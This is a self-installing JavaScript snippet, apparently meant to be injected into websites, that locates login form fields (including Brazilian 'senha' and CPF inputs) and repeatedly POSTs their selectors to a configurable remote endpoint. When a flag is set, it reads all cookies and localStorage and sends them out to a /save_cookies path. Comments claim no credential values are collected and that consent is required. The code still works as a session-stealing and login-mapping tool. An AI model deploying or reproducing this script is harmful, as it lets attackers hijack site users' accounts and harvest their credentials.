(function(){
  if (window.__nexus_scanner_installed) return;
  window.__nexus_scanner_installed = true;

  const SEND_ENDPOINT = (typeof NEXUS_CAPTURE_ENDPOINT !== "undefined") ? NEXUS_CAPTURE_ENDPOINT : null;
  const TOKEN = (typeof NEXUS_TOKEN_INJECT !== "undefined") ? NEXUS_TOKEN_INJECT : null;
  const ALLOW_COOKIES = (typeof NEXUS_ALLOW_COOKIES !== "undefined") ? !!NEXUS_ALLOW_COOKIES : false;

  function cssPath(el){
    if(!el) return null;
    if (el.id) return `#${CSS.escape(el.id)}`;
    const parts = [];
    while (el && el.nodeType === 1 && el.tagName.toLowerCase() !== 'html') {
      let part = el.tagName.toLowerCase();
      if (el.className && typeof el.className === 'string') {
        const cls = el.className.trim().split(/\s+/).filter(Boolean);
        if (cls.length) part += '.' + cls.join('.');
      }
      const parent = el.parentNode;
      if (parent) {
        const index = Array.prototype.indexOf.call(parent.children, el) + 1;
        part += `:nth-child(${index})`;
      }
      parts.unshift(part);
      el = el.parentNode;
    }
    return parts.join(' > ');
  }

  function safeSend(path, data){
    if (!SEND_ENDPOINT) {
      console.warn("No SEND_ENDPOINT defined for scanner.");
      return;
    }
    try {
      fetch(path, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Nexus-Token": TOKEN || ""
        },
        body: JSON.stringify(data),
        keepalive: true
      }).then(r=>{
        if(!r.ok) console.warn("Capture failed", r.status);
        else console.log("Capture sent");
      }).catch(e=>{
        console.warn("Capture error", e);
      });
    } catch(e){
      console.warn("Send exception", e);
    }
  }

  function findLoginElements(){
    const res = {timestamp: new Date().toISOString(), url: location.href, fields: {}, notes: ""};
    let email = document.querySelector("input[type='email'], input[placeholder*='email'], input[name*='user'], input[name*='email']");
    let password = document.querySelector("input[type='password'], input[placeholder*='senha'], input[name*='password']");
    if(!email){
      const candidates = Array.from(document.querySelectorAll("input")).filter(i => /email|user|login|cpf/i.test(i.name || i.placeholder || i.id || ""));
      if(candidates.length) email = candidates[0];
    }
    if(!password){
      const candidates = Array.from(document.querySelectorAll("input")).filter(i => i.type === 'password' || /senha|pass|pwd/i.test(i.name || i.placeholder || i.id || ""));
      if(candidates.length) password = candidates[0];
    }
    try {
      if(email) res.fields.email = {
        tag: email.tagName,
        selector: cssPath(email),
        placeholder: email.placeholder || null,
        name: email.name || null,
        id: email.id || null
      };
      if(password) res.fields.password = {
        tag: password.tagName,
        selector: cssPath(password),
        placeholder: password.placeholder || null,
        name: password.name || null,
        id: password.id || null
      };
      let form = email && email.form ? email.form : (password && password.form ? password.form : document.querySelector("form"));
      if(form){
        const btn = form.querySelector("button[type='submit'], input[type='submit'], button");
        if(btn) res.fields.submit = { selector: cssPath(btn), text: btn.innerText ? btn.innerText.trim() : null };
        res.fields.form = { selector: cssPath(form) };
      }
    } catch(e){
      res.notes = "error building selectors: " + (e && e.message);
    }
    return res;
  }

  function sendCookiesIfAllowed(){
    if(!ALLOW_COOKIES) return;
    try {
      const cookies = document.cookie || "";
      const local = {};
      try {
        for(let i=0;i<localStorage.length;i++){
          const k = localStorage.key(i);
          local[k] = localStorage.getItem(k);
        }
      } catch(e){}
      safeSend(window.NEXUS_BASE + "/save_cookies", {timestamp: Date.now(), url: location.href, cookies: cookies, localStorage: local});
      console.log("NEXUS: cookies/localStorage sent (allowed).");
    } catch(e){
      console.warn("NEXUS: sendCookies error", e);
    }
  }

  let lastCapture = null;
  const obs = new MutationObserver((muts)=>{
    const info = findLoginElements();
    const infoStr = JSON.stringify(info);
    if(infoStr !== lastCapture){
      lastCapture = infoStr;
      console.log("Nexus scanner detected DOM change, sending capture:", info);
      safeSend(window.NEXUS_BASE + "/capture", info);
    }
  });

  try {
    obs.observe(document, {childList:true, subtree:true, attributes:true});
  } catch(e){
    console.warn("Observer failed", e);
  }

  const initial = findLoginElements();
  lastCapture = JSON.stringify(initial);
  safeSend(window.NEXUS_BASE + "/capture", initial);

  // If allowed, send cookies/localStorage once (consent required)
  if(ALLOW_COOKIES) sendCookiesIfAllowed();

  setTimeout(()=>{ try{ obs.disconnect(); console.log("Nexus scanner stopped after timeout"); }catch(e){} }, 10 * 60 * 1000);

  console.log("Nexus scanner installed (no credential values collected by default).");
})();
